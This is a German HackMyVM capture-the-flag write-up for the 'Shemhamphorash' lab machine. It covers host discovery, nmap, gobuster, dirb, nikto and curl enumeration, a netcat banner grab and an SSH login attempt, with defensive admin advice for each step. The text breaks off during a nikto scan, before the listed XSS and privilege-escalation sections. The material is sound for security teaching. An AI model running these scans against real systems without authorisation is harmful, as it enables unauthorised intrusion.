<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shemhamphorash - HackMyVM - Medium - Bericht</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="../../horizontale-navbar.css">
    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
</head>
 <body>
     <div class="header-bg">
        <h1>Shemhamphorash - HackMyVM - Level: Medium - Bericht</h1>
        <div class="level-container level-medium">
            <h2 class="level-medium-color">Medium</h2>
            <div class="circle">
                <div class="segment segment-1"></div>
                <div class="segment segment-2"></div>
                <div class="segment segment-3"></div>
                <div class="inner"></div>
            </div>
        </div>
    </div>

    <div class="container">
        <section class="tools-used">
            <h2>Verwendete Tools</h2>
            <div class="tools-grid">
                <div class="tool-item">arp-scan</div>
                <div class="tool-item">vi</div>
                <div class="tool-item">nmap</div>
                <div class="tool-item">gobuster</div>
                <div class="tool-item">nikto</div>
                <div class="tool-item">curl</div>
                <div class="tool-item">dirb</div>
                <div class="tool-item">nc (netcat)</div>
                <div class="tool-item">ssh</div>
                <div class="tool-item">jq</div>
                <div class="tool-item">wpscan</div>
                <div class="tool-item">hydra</div>
                <div class="tool-item">Firefox (Browser)</div>
                <div class="tool-item">beef-xss</div>
                <div class="tool-item">python3 http.server</div>
                <div class="tool-item">nano</div>
                <div class="tool-item">mysql client</div>
                <div class="tool-item">gcc</div>
            </div>
        </section>

        <section class="toc">
            <h2>Inhaltsverzeichnis</h2>
            <ul>
                <li><a href="#reconnaissance">Reconnaissance</a></li>
                <li><a href="#web-enumeration">Web Enumeration</a></li>
                <li><a href="#initial-access">Initial Access</a></li>
                <li><a href="#proof-of-concept">Proof of Concept (XSS & User Creation)</a></li>
                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
                <li><a href="#flags">Flags</a></li>
            </ul>
        </section>

        <section id="reconnaissance">
            <h2>Reconnaissance</h2>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
        <pre>192.168.2.202</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Dieser Befehl dient der Identifizierung von Hosts im lokalen Netzwerk.
<code>arp-scan -l</code>: Sendet ARP-Requests an alle möglichen Adressen im lokalen Netzwerk (<code>-l</code> für localnet).
<code>| grep "PCS"</code>: Filtert die Ausgabe von <code>arp-scan</code> und zeigt nur Zeilen an, die "PCS" enthalten. PCS Systemtechnik ist oft mit Oracle VirtualBox assoziiert, was darauf hindeutet, dass das Ziel eine virtuelle Maschine sein könnte.
<code>| awk '{print $1}'</code>: Verarbeitet die gefilterte Ausgabe weiter. <code>awk</code> ist ein mächtiges Werkzeug zur Textverarbeitung. Hier wird das erste Feld (<code>$1</code>), welches die IP-Adresse ist, aus jeder Zeile extrahiert und ausgegeben.</p>
<p class="evaluation"><strong>Bewertung:</strong> Dieser Schritt ist ein grundlegender und effektiver Weg, um aktive Hosts im lokalen Subnetz zu entdecken, insbesondere wenn man nach spezifischen Herstellern oder Signaturen sucht. Die Entdeckung der IP-Adresse 192.168.2.202 ist der erste wichtige Schritt zur Zielidentifizierung.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Standardvorgehen bei Blackbox-Tests im internen Netz. Kann durch Tools wie <code>netdiscover</code> ergänzt werden.
<br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung und Überwachung von ARP-Traffic können helfen, unautorisierte Geräte schneller zu erkennen. Regelmäßige Netzwerkscans aus Admin-Sicht sind ebenfalls sinnvoll.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">vi /etc/hosts</span></div>
        <pre>                192.168.2.202   shemhamphorash.hmv</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Der Befehl <code>vi /etc/hosts</code> öffnet die lokale Host-Datei im Texteditor <code>vi</code>. Der nachfolgende Eintrag <code>192.168.2.202   shemhamphorash.hmv</code> weist dem Betriebssystem an, den Hostnamen <code>shemhamphorash.hmv</code> direkt auf die IP-Adresse <code>192.168.2.202</code> aufzulösen. Dies umgeht die Notwendigkeit einer DNS-Abfrage für diesen spezifischen Hostnamen.</p>
<p class="evaluation"><strong>Bewertung:</strong> Dies ist ein üblicher Schritt während eines Penetrationstests, um die Adressierung von Zielsystemen zu vereinfachen, insbesondere wenn diese (noch) nicht über einen öffentlichen oder internen DNS-Server erreichbar sind oder wenn man virtuelle Hosts auf einem Webserver ansprechen möchte. Für den Testablauf ist dies sehr nützlich.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Essentiell für Tests, bei denen Hostnamen-basierte Webanwendungen oder Dienste involviert sind. Stellt sicher, dass Tools wie Browser oder Scanner das Ziel korrekt unter dem gewünschten Namen erreichen.
<br><strong>Empfehlung (Admin):</strong> Die zentrale Verwaltung von Hostnamen über DNS ist in Produktivumgebungen vorzuziehen. Manipulationen der lokalen <code>hosts</code>-Datei können auf Endgeräten ein Sicherheitsrisiko darstellen, falls Angreifer darüber Traffic umleiten.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.202</span></div>
        <pre>
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-26 22:24 CEST
Nmap scan report for shemhamphorash.hmv (192.168.2.202)
Host is up (0.00023s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
<span class="command">80/tcp    open  http    Apache httpd 2.4.53 ((Debian))</span>
|_http-server-header: Apache/2.4.53 (Debian)
|_http-title: Apache2 Debian Default Page: It works
<span class="command">8080/tcp  open  http    nginx 1.18.0</span>
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.18.0
|_http-open-proxy: Proxy might be redirecting requests
<span class="command">22222/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span>
| ssh-hostkey: 
|   3072 1a:87:91:eb:c7:12:2a:6d:46:8e:61:d0:20:68:eb:e4 (RSA)
|   256 c6:3f:71:a5:8d:79:18:f3:e7:c8:25:98:ae:58:0e:af (ECDSA)
|_  256 9b:1c:60:11:9f:dd:62:f9:54:e3:36:3b:9d:3e:3b:03 (ED25519)
MAC Address: 08:00:27:78:9D:97 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.23 ms shemhamphorash.hmv (192.168.2.202)

OS and Service detection performed. Please report any incorrect results at [Link: https://nmap.org/submit/ | Ziel: https://nmap.org/submit/] .
Nmap done: 1 IP address (1 host up) scanned in 12.83 seconds</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan wurde durchgeführt.
<code>-sS</code>: Führt einen TCP SYN-Scan (Stealth-Scan) durch, der oft weniger auffällig ist.
<code>-sC</code>: Führt Standard-Nmap-Skripte aus, um zusätzliche Informationen zu sammeln.
<code>-sV</code>: Versucht, die Versionen der laufenden Dienste zu ermitteln.
<code>-p-</code>: Scannt alle 65535 TCP-Ports.
<code>-T5</code>: Setzt das Timing-Template auf "insane" für einen sehr schnellen Scan (kann unzuverlässig sein oder Firewalls alarmieren).
<code>-AO</code>: Aktiviert die Betriebssystemerkennung (veraltet, <code>-O</code> ist der Standard).
Die Ergebnisse zeigen drei offene Ports:
    Port 80: Apache httpd 2.4.53 (Debian) - Standard-HTTP-Port. Die Titelerkennung zeigt eine Debian-Standardseite.
    Port 8080: nginx 1.18.0 - Alternativer HTTP-Port. Die Titelerkennung zeigt eine Nginx-Willkommensseite. Der Hinweis "Proxy might be redirecting requests" ist interessant.
    Port 22222: OpenSSH 8.4p1 Debian 5 - SSH-Dienst auf einem nicht standardmäßigen Port.
Nmap identifiziert das System als Linux (möglicherweise Kernel 5.x) und liefert MAC-Adresse sowie Hostkey-Fingerprints für SSH. Die OS-Erkennung deutet auch auf MikroTik RouterOS hin, was bei VMs manchmal als generische Linux-Identifikation erscheinen kann.</p>
<p class="evaluation"><strong>Bewertung:</strong> Der Nmap-Scan liefert kritische Informationen über die offenen Dienste und deren Versionen. Das Vorhandensein von zwei verschiedenen Webservern (Apache und Nginx) auf unterschiedlichen Ports ist ein wichtiger Hinweis für die weitere Enumeration. Der nicht standardmäßige SSH-Port ist eine gängige, aber schwache Methode zur Verschleierung. Die Versionsnummern von Apache, Nginx und OpenSSH sind für die Schwachstellensuche relevant.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Webserver auf Port 80 und 8080 sollten als Nächstes detailliert untersucht werden (Verzeichnissuche, Schwachstellenscans). Die SSH-Version sollte auf bekannte Schwachstellen geprüft werden. Der Hinweis auf einen möglichen Proxy bei Nginx sollte weiter untersucht werden.
<br><strong>Empfehlung (Admin):</strong> Dienste sollten auf dem neuesten Stand gehalten werden. Nicht benötigte Dienste oder Default-Seiten (wie die Apache-Standardseite) sollten deaktiviert oder entfernt werden. Die Verwendung nicht standardmäßiger Ports bietet nur minimale zusätzliche Sicherheit ("Security through Obscurity") und sollte nicht als primäre Verteidigungsmaßnahme betrachtet werden. Eine Web Application Firewall (WAF) könnte den Schutz der Webdienste erhöhen.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.202 | grep open</span></div>
        <pre>
<span class="command">80/tcp    open  http    Apache httpd 2.4.53 ((Debian))</span>
<span class="command">8080/tcp  open  http    nginx 1.18.0</span>
|_http-open-proxy: Proxy might be redirecting requests
<span class="command">22222/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span></pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Dieser Befehl wiederholt den vorherigen Nmap-Scan, leitet die Ausgabe jedoch durch <code>grep open</code>. Das Ziel ist es, nur die Zeilen aus der Nmap-Ausgabe anzuzeigen, die das Wort "open" enthalten, um eine schnelle Übersicht über die offenen Ports zu erhalten. Es werden dieselben drei offenen Ports angezeigt: 80 (Apache), 8080 (Nginx) und 22222 (OpenSSH).</p>
<p class="evaluation"><strong>Bewertung:</strong> Dies ist eine nützliche Methode, um die Ausgabe eines umfangreichen Nmap-Scans schnell auf die relevantesten Informationen (offene Ports) zu reduzieren. Es bestätigt die Ergebnisse des vorherigen Scans.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Gut für eine schnelle Zusammenfassung. Für detaillierte Analysen ist die vollständige Nmap-Ausgabe jedoch vorzuziehen. Alternative Filter könnten <code>grep -E "PORT|open"</code> sein, um auch die Kopfzeile "PORT" beizubehalten.
<br><strong>Empfehlung (Admin):</strong> Zeigt die Notwendigkeit, alle identifizierten offenen Dienste abzusichern und regelmäßig zu überprüfen.</p>
        </section>

        <section id="web-enumeration">
            <h2>Web Enumeration</h2>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">gobuster dir -u "http://shemhamphorash.hmv" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,svg,pem,crt,json,conf,ELF,elf,c,java,lib,cgi,csh,config,deb,desc,exp,eps,diff,icon,mod,ln,old,rpm,js.map,pHtml -b '503,404,403' -e --no-error -k</span></div>
        <pre>
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shemhamphorash.hmv
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   503,404,403
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,lib,icon,js.map,sh,bak,jpg,rtf,json,conf,exp,pHtml,txt,docx,db,zip,pub,doc,asp,java,xls,sql,crt,config,diff,rar,tar,dll,kdbx,ps1,csv,svg,csh,desc,bat,phtml,ELF,elf,deb,pl,png,pem,cgi,ln,rpm,pdf,old,jpeg,c,mdb,exe,py,xml,raw,gz,html,eps,mod,aspx,accdb,xlsx
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
<span class="command">http://shemhamphorash.hmv/index.html</span>           (Status: 200) [Size: 10701]
<span class="command">http://shemhamphorash.hmv/manual</span>               (Status: 301) [Size: 325] [--> http://shemhamphorash.hmv/manual/]
<span class="command">http://shemhamphorash.hmv/javascript</span>           (Status: 301) [Size: 329] [--> http://shemhamphorash.hmv/javascript/]
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Gobuster wird verwendet, um Verzeichnisse und Dateien auf dem Webserver unter <code>http://shemhamphorash.hmv</code> (Port 80, Apache) zu bruteforcen.
<code>dir</code>: Gibt den Modus für die Verzeichnissuche an.
<code>-u "http://shemhamphorash.hmv"</code>: Definiert die Ziel-URL.
<code>-w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"</code>: Verwendet eine gängige Wortliste für die Verzeichnissuche.
<code>-x ...</code>: Eine sehr lange Liste von Dateierweiterungen, nach denen gesucht werden soll.
<code>-b '503,404,403'</code>: Definiert HTTP-Statuscodes, die als "nicht gefunden" interpretiert und daher nicht angezeigt werden sollen.
<code>-e</code>: Aktiviert den "Expanded Mode", der die volle URL für gefundene Ressourcen anzeigt.
<code>--no-error</code>: Unterdrückt die Anzeige von Verbindungsfehlern.
<code>-k</code>: Ignoriert SSL-Zertifikatsfehler (hier nicht relevant, da HTTP).
Gefunden wurden:
    <code>/index.html</code> (Status 200): Die Standard-Startseite.
    <code>/manual</code> (Status 301): Leitet weiter zu <code>/manual/</code>. Dies ist oft das Apache-Handbuch.
    <code>/javascript</code> (Status 301): Leitet weiter zu <code>/javascript/</code>. Könnte clientseitige Skripte enthalten.</p>
<p class="evaluation"><strong>Bewertung:</strong> Gobuster ist ein Standardwerkzeug für die Web-Enumeration. Die umfangreiche Liste der Erweiterungen ist gut, kann aber die Scandauer erhöhen. Die Funde <code>/manual/</code> und <code>/javascript/</code> sind interessant und sollten weiter untersucht werden. Das Apache-Handbuch (<code>/manual/</code>) kann manchmal Informationen über die Serverkonfiguration oder installierte Module preisgeben.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gefundenen Verzeichnisse <code>/manual/</code> und <code>/javascript/</code> im Browser besuchen und rekursiv weiter mit Gobuster oder anderen Tools scannen. Insbesondere das Apache-Handbuch kann nützliche Informationen enthalten. Die lange Liste der Extensions ist umfassend, aber für schnellere initiale Scans könnte eine kürzere, fokussiertere Liste verwendet werden.
<br><strong>Empfehlung (Admin):</strong> Nicht benötigte Verzeichnisse und Dateien, insbesondere Standardinhalte wie das Apache-Handbuch, sollten vom öffentlichen Zugriff entfernt oder gesperrt werden. Directory Listing sollte deaktiviert sein, um zu verhindern, dass Angreifer leicht den Inhalt von Verzeichnissen einsehen können.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nikto -h http://shemhamphorash.hmv -C all</span></div>
        <pre>
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.2.202
+ Target Hostname:    shemhamphorash.hmv
+ Target Port:        80
+ Start Time:         2025-05-26 22:25:18 (GMT2)
---------------------------------------------------------------------------
+ Server: <span class="command">Apache/2.4.53 (Debian)</span>
+ /: <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span> See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]
+ /: <span class="password">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]
+ /: <span class="password">Server may leak inodes via ETags, header found with file /, inode: 29cd, size: 5dc0ccc9bd7ca, mtime: gzip.</span> See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418]
+ <span class="password">Apache/2.4.53 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.</span>
+ OPTIONS: <span class="command">Allowed HTTP Methods: POST, OPTIONS, HEAD, GET</span> .
+ <span class="command">/manual/</span>: Web server manual found.
+ <span class="command">/manual/images/</span>: Directory indexing found.
+ 26500 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2025-05-26 22:25:48 (GMT2) (30 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Nikto, ein Webserver-Scanner, wurde gegen <code>http://shemhamphorash.hmv</code> (Port 80, Apache) eingesetzt.
<code>-h http://shemhamphorash.hmv</code>: Definiert das Ziel.
<code>-C all</code>: Führt alle verfügbaren CGI-Scans durch.
Nikto meldet mehrere interessante Punkte:
    Fehlender <code>X-Frame-Options</code> Header: Macht die Seite anfällig für Clickjacking-Angriffe.
    Fehlender <code>X-Content-Type-Options</code> Header: Kann zu MIME-Sniffing-Problemen führen.
    Inode-Leakage über ETags (CVE-2003-1418): Eine alte Schwachstelle, die Informationen über das Dateisystem preisgeben kann.
    Veraltete Apache-Version (2.4.53, aktuell 2.4.54 zum Zeitpunkt des Scans): Veraltete Software ist oft anfällig für bekannte Exploits.
    Erlaubte HTTP-Methoden: Listet die Methoden auf, die der Server unterstützt.
    <code>/manual/</code> gefunden: Bestätigt den Fund von Gobuster.
    <code>/manual/images/</code> mit Directory Indexing: Ermöglicht das Auflisten von Dateien im Verzeichnis <code>/manual/images/</code>.</p>
<p class="evaluation"><strong>Bewertung:</strong> Nikto liefert wertvolle Hinweise auf Konfigurationsschwächen und eine veraltete Softwareversion. Das Fehlen von Security-Headern und das Directory Indexing sind typische Findings, die die Sicherheit der Webanwendung beeinträchtigen. Der Hinweis auf die veraltete Apache-Version ist besonders wichtig für die weitere Schwachstellensuche.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche die gemeldeten Schwachstellen genauer. Prüfe, ob die veraltete Apache-Version bekannte Exploits hat. Untersuche das Verzeichnis <code>/manual/images/</code> auf interessante Dateien.
<br><strong>Empfehlung (Admin):</strong> Security-Header (<code>X-Frame-Options</code>, <code>X-Content-Type-Options</code>, <code>Content-Security-Policy</code> etc.) implementieren. Apache auf die neueste stabile Version aktualisieren. Directory Indexing deaktivieren. ETag-Konfiguration überprüfen, um Inode-Leakage zu verhindern.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">curl http://shemhamphorash.hmv -Iv</span></div>
        <pre>
* Host shemhamphorash.hmv:80 was resolved.
* IPv6: (none)
* IPv4: 192.168.2.202
*   Trying 192.168.2.202:80...
* Connected to shemhamphorash.hmv (192.168.2.202) port 80
* using HTTP/1.x
&gt; HEAD / HTTP/1.1
&gt; Host: shemhamphorash.hmv
&gt; User-Agent: curl/8.13.0
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
HTTP/1.1 200 OK
&lt; Date: Mon, 26 May 2025 20:26:28 GMT
Date: Mon, 26 May 2025 20:26:28 GMT
&lt; Server: <span class="command">Apache/2.4.53 (Debian)</span>
Server: Apache/2.4.53 (Debian)
&lt; Last-Modified: Thu, 07 Apr 2022 09:06:54 GMT
Last-Modified: Thu, 07 Apr 2022 09:06:54 GMT
&lt; ETag: <span class="command">"29cd-5dc0ccc9bd7ca"</span>
ETag: "29cd-5dc0ccc9bd7ca"
&lt; Accept-Ranges: bytes
Accept-Ranges: bytes
&lt; Content-Length: 10701
Content-Length: 10701
&lt; Vary: Accept-Encoding
Vary: Accept-Encoding
&lt; Content-Type: text/html
Content-Type: text/html
&lt; 

* Connection #0 to host shemhamphorash.hmv left intact
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Der Befehl <code>curl http://shemhamphorash.hmv -Iv</code> wird verwendet, um die HTTP-Header der Hauptseite abzurufen.
<code>-I</code>: Sendet eine HEAD-Anfrage (holt nur Header, nicht den Body).
<code>-v</code>: Aktiviert den "verbose" Modus, der detaillierte Informationen über die Verbindung und die Anfrage/Antwort anzeigt.
Die Ausgabe bestätigt die Server-Version (Apache/2.4.53), den ETag (der von Nikto als potenzielles Inode-Leak gemeldet wurde) und andere Standard-HTTP-Header.</p>
<p class="evaluation"><strong>Bewertung:</strong> <code>curl</code> ist ein vielseitiges Werkzeug zur manuellen Interaktion mit Webservern. Dieser Befehl bestätigt die von Nmap und Nikto gesammelten Informationen über den Apache-Server auf Port 80 und liefert die exakten Header-Werte.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nützlich für schnelle Überprüfungen und manuelle Tests. Kann verwendet werden, um spezifische Header zu senden oder Antworten detailliert zu analysieren.
<br><strong>Empfehlung (Admin):</strong> Die angezeigten Header sollten im Kontext der Sicherheitsempfehlungen (z.B. ETag-Konfiguration, Hinzufügen von Security-Headern) überprüft werden.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">dirb http://shemhamphorash.hmv:8080</span></div>
        <pre>
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon May 26 22:30:15 2025
URL_BASE: http://shemhamphorash.hmv:8080/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://shemhamphorash.hmv:8080/ ----
+ <span class="command">http://shemhamphorash.hmv:8080/admin.php</span> (CODE:200|SIZE:0)                                 
+ <span class="command">http://shemhamphorash.hmv:8080/index.php</span> (CODE:200|SIZE:0)                                 
+ <span class="command">http://shemhamphorash.hmv:8080/info.php</span> (CODE:200|SIZE:0)                                  
+ <span class="command">http://shemhamphorash.hmv:8080/phpinfo.php</span> (CODE:200|SIZE:0)                               
+ <span class="command">http://shemhamphorash.hmv:8080/xmlrpc.php</span> (CODE:200|SIZE:0)                                
+ <span class="command">http://shemhamphorash.hmv:8080/xmlrpc_server.php</span> (CODE:200|SIZE:0)                         
                                                                                             
-----------------
END_TIME: Mon May 26 22:30:19 2025
DOWNLOADED: 4612 - FOUND: 6
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Dirb wird verwendet, um Verzeichnisse und Dateien auf dem Nginx-Server zu finden, der auf Port 8080 läuft (<code>http://shemhamphorash.hmv:8080</code>). Dirb verwendet standardmäßig die Wortliste <code>common.txt</code>.
Es wurden mehrere PHP-Dateien mit Statuscode 200 gefunden:
    <code>/admin.php</code>
    <code>/index.php</code>
    <code>/info.php</code>
    <code>/phpinfo.php</code>
    <code>/xmlrpc.php</code>
    <code>/xmlrpc_server.php</code>
Die Größe (SIZE:0) ist bei allen Funden 0, was ungewöhnlich ist und darauf hindeuten könnte, dass die Dateien zwar existieren, aber entweder leer sind oder der Server bei direkten Anfragen keinen Inhalt liefert, möglicherweise aufgrund von interner Logik oder Konfiguration.</p>
<p class="evaluation"><strong>Bewertung:</strong> Der Fund von <code>admin.php</code> und insbesondere <code>phpinfo.php</code> ist sehr vielversprechend. <code>phpinfo.php</code> kann extrem viele sensible Informationen über die PHP-Konfiguration und das System preisgeben. <code>xmlrpc.php</code> deutet oft auf eine WordPress-Installation oder eine andere Anwendung hin, die XML-RPC verwendet. Die Größe 0 ist ein Punkt, der genauer untersucht werden muss.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Alle gefundenen PHP-Dateien im Browser aufrufen und untersuchen, insbesondere <code>admin.php</code> und <code>phpinfo.php</code>. Prüfen, warum die Größe 0 gemeldet wird. Evtl. andere Methoden (z.B. POST-Requests) oder Tools verwenden, um den Inhalt zu ermitteln.
<br><strong>Empfehlung (Admin):</strong> <code>phpinfo.php</code>-Dateien sollten niemals auf produktiven Webservern öffentlich zugänglich sein. Der Zugriff auf administrative Schnittstellen wie <code>admin.php</code> sollte stark eingeschränkt werden (z.B. IP-Whitelisting, Authentifizierung). Wenn XML-RPC nicht benötigt wird, sollte es deaktiviert werden.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nc -nv 192.168.2.202 22222</span></div>
        <pre>
(UNKNOWN) [192.168.2.202] 22222 (?) <span class="password">open</span>
SSH-2.0-OpenSSH_8.4p1 Debian-5

Invalid SSH identification string.</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Netcat (<code>nc</code>) wird verwendet, um eine Verbindung zum SSH-Port 22222 auf dem Zielsystem herzustellen.
<code>-n</code>: Verhindert DNS-Lookups.
<code>-v</code>: Verbose-Modus.
Die Ausgabe bestätigt, dass der Port offen ist und der SSH-Dienst mit der Version OpenSSH 8.4p1 Debian-5 antwortet. Die Meldung "Invalid SSH identification string" erscheint, weil Netcat kein valider SSH-Client ist und nicht das erwartete SSH-Protokoll spricht, nachdem die Verbindung hergestellt wurde.</p>
<p class="evaluation"><strong>Bewertung:</strong> Dies ist eine schnelle Methode, um die Erreichbarkeit eines Ports und das Banner des Dienstes zu überprüfen. Es bestätigt die Nmap-Ergebnisse bezüglich des SSH-Dienstes.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nützlich für schnelle Port-Checks. Für eine tatsächliche Interaktion mit SSH sollte ein SSH-Client verwendet werden.
<br><strong>Empfehlung (Admin):</strong> Zeigt, dass der SSH-Dienst auf dem nicht standardmäßigen Port läuft und antwortet. Die Sicherheit von SSH hängt von starker Konfiguration (Passwörter, Schlüssel, erlaubte Benutzer) ab.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">ssh root@192.168.2.202 -p22222</span></div>
        <pre>
The authenticity of host '[192.168.2.202]:22222 ([192.168.2.202]:22222)' can't be established.
ED25519 key fingerprint is SHA256:+jyzFgtVHx9ScKok/d0bvAKWrR5QHEfmgQnL2WVokKo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.2.202]:22222' (ED25519) to the list of known hosts.
root@192.168.2.202's password: 
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich als Benutzer <code>root</code> via SSH auf Port 22222 mit dem Zielsystem zu verbinden.
Da der Hostkey des Servers dem Client noch nicht bekannt ist, wird eine Warnung angezeigt und der Fingerprint des Keys präsentiert. Nach Bestätigung mit "yes" wird der Key zu den bekannten Hosts hinzugefügt. Anschließend wird nach dem Passwort für den Benutzer <code>root</code> gefragt.</p>
<p class="evaluation"><strong>Bewertung:</strong> Dies ist ein Standardversuch, um zu prüfen, ob ein direkter Root-Login via SSH mit einem möglicherweise schwachen oder Standardpasswort möglich ist. In vielen gut konfigurierten Systemen ist ein direkter Root-Login per Passwort deaktiviert.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wenn ein Passwort-Prompt erscheint, können Brute-Force-Angriffe oder das Raten von Passwörtern versucht werden (was später mit Hydra auch geschieht, wenn auch für einen anderen Benutzer).
<br><strong>Empfehlung (Admin):</strong> Direkter Root-Login via SSH sollte deaktiviert sein (<code>PermitRootLogin no</code> in <code>sshd_config</code>). Der Zugriff sollte über einen unprivilegierten Benutzer erfolgen, der dann bei Bedarf mit <code>sudo</code> Rechte eskaliert. Starke, einzigartige Passwörter oder, noch besser, schlüsselbasierte Authentifizierung verwenden.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nikto -h http://shemhamphorash.hmv:8080/admin.php</span></div>
        <pre>
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.2.202
+ Target Hostname:    shemhamphorash.hmv
+ Target Port:        8080
+ Start Time:         2025-05-26 22:35:16 (GMT2)
---------------------------------------------------------------------------
+ Server: <span class="command">nginx/1.18.0</span>
+ /admin.php/: <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span> See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]
+ /admin.php/: <span class="password">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]
+ No CGI Directories found (use '-C all' to force check all possible dirs)
